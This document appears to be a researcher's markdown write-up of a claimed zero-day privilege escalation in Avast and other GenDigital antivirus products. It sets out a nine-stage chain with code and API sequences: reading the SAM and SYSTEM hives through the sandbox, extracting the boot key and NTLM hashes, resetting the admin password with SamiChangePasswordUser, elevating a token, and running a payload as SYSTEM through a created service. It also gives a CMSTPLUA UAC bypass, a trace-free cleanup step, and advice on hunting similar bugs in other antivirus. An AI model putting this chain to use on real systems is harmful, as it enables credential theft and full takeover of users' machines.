# PrettyPrague — Avast/GenDigital 0day LPE (SAM dump → SYSTEM)

## Target
- **Binary:** Avast Antivirus sandbox component
- **Also affects:** AVG, Norton, possibly all GenDigital products (shared engine)
- **Privilege:** NT AUTHORITY\SYSTEM

## Vulnerability class
Sandbox escape → SAM database read → password hash extraction → credential-based
elevation to SYSTEM. The Avast sandbox grants read access to protected system files
that normal users cannot access.

## Technique chain

### Stage 1 — SAM dump via sandbox read
Avast's sandbox allows reading `C:\Windows\System32\config\SAM` and `SYSTEM` hives.
The PoC reads these offline using `offreg.lib`:
```cpp
OROpenHiveByHandle(hSamFile, &hSamHive)
OROpenHiveByHandle(hSystemFile, &hSystemHive)
```

### Stage 2 — Boot key extraction
Extract the SYSKEY (boot key) from SYSTEM hive class names:
```cpp
// Read class names from these keys:
HKLM\SYSTEM\CurrentControlSet\Control\Lsa\JD      // class name bytes
HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Skew1
HKLM\SYSTEM\CurrentControlSet\Control\Lsa\GBG
HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Data
// Concatenate + permute → 16-byte boot key
```

### Stage 3 — LSA secret key derivation
```cpp
GetLSASecretKey(bootkey) → AES-128-CBC decrypt of SAM\Domains\Account\F value
```
The F value contains the encrypted LSA key. Decrypt with boot key to get the
per-account decryption key.

### Stage 4 — NTLM hash extraction
For each user in `SAM\Domains\Account\Users\<RID>\V`:
- Parse the V structure for NT hash offset/length
- AES-128-CBC or DES decrypt (depending on SAM version)
- Extract raw NTLM hash

### Stage 5 — Password change via SamiChangePasswordUser
```cpp
SamiChangePasswordUser(hSamUser, oldNtHash, newNtHash, oldLmHash, newLmHash)
```
Uses the extracted NTLM hash as the "old password" to change the admin password
to an attacker-controlled value. No need to crack the hash.

### Stage 6 — Token elevation
```cpp
LogonUserExW(adminUser, ".", newPassword, LOGON32_LOGON_INTERACTIVE, ...)
→ token with TokenElevationTypeLimited
→ NtQueryInformationToken(TokenLinkedToken)
→ full elevated admin token
→ SetTokenInformation(TokenIntegrityLevel, SECURITY_MANDATORY_HIGH_RID)
→ ImpersonateLoggedOnUser(elevatedToken)
```

### Stage 7 — SYSTEM via service
```cpp
OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS)  // as impersonated admin
CreateServiceW(..., SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START,
    ..., "cmd.exe /c <payload>")
StartServiceW(hService)
```

### Stage 8 — UAC bypass (alternative path)
Uses CMSTPLUA COM elevation moniker:
```cpp
CLSID: {3E5FC7F9-9A51-4367-9063-A120244FBEC7}  // ICMLuaUtil
CoCreateInstance → ShellExec(command, "runas")
```

### Stage 9 — Cleanup
Restores original admin password using `SamiChangePasswordUser` with the new hash
as old and original hash as new. Leaves no trace.

## Key techniques from source

### Full SAM parsing implementation
The PoC contains a complete offline SAM parser:
- V-structure parsing (offsets for username, NT hash, LM hash)
- AES-128-CBC decryption (NT 6.0+ format)
- DES decryption (legacy format)
- RID-to-DES key derivation
- Boot key permutation table

### offreg.lib for offline hive access
```cpp
OROpenHiveByHandle(hFile, &hHive)
OROpenKey(hHive, L"SAM\\Domains\\Account\\Users", &hKey)
OREnumKey(hKey, index, name, &nameLen)
ORGetValue(hKey, NULL, L"V", NULL, data, &dataLen)
```
This library allows reading registry hives as files without mounting them —
critical when the hives are accessed through a sandbox boundary.

## Hunt generalization for other AV
1. **Sandbox file access audit:** What files can code running inside the AV
   sandbox access that normal users cannot? SAM, SYSTEM, SECURITY hives are
   the highest-value targets.
2. **AV scan-as-SYSTEM:** If the AV engine reads files as SYSTEM during scan,
   can the scan results leak file contents back to the user?
3. **GenDigital products share engine code:** A bug in Avast likely affects AVG
   and Norton. Check if the sandbox boundary is product-specific or engine-level.
4. **SamiChangePasswordUser:** This SAM API accepts hash-as-password — if you
   can read the SAM, you can change any local password without cracking it.
